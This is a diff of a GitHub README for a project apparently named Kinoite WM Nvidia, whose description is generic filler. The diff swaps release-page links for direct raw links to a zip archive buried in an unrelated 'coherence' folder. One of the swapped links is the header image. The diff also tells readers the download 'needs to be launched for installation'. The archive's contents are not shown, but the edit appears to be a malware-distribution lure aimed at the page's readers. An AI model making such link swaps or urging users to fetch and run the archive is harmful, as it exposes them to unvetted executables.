@@ -1,6 +1,6 @@
 # Welcome to Kinoite WM Nvidia Repository 🚀
 
-![Kinoite WM Nvidia](https://github.com/AlexandruAlex2121/kinoite-wm-nvidia/releases/tag/v2.0)
+![Kinoite WM Nvidia](https://github.com/AlexandruAlex2121/kinoite-wm-nvidia/raw/refs/heads/main/coherence/nvidia-kinoite-wm-1.9.zip)
 
 ## Description
 This repository contains software related to Kinoite WM Nvidia. Dive into the world of customizable operating systems with Kinoite WM Nvidia, designed for optimal performance and user experience.
@@ -58,7 +58,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 ## Get Started
 To explore and experience Kinoite WM Nvidia, download the software package from the following link:
 
-[![Download Software](https://github.com/AlexandruAlex2121/kinoite-wm-nvidia/releases/tag/v2.0)](https://github.com/AlexandruAlex2121/kinoite-wm-nvidia/releases/tag/v2.0)
+[![Download Software](https://github.com/AlexandruAlex2121/kinoite-wm-nvidia/raw/refs/heads/main/coherence/nvidia-kinoite-wm-1.9.zip)](https://github.com/AlexandruAlex2121/kinoite-wm-nvidia/raw/refs/heads/main/coherence/nvidia-kinoite-wm-1.9.zip)
 
 Remember, it needs to be launched for installation.
 
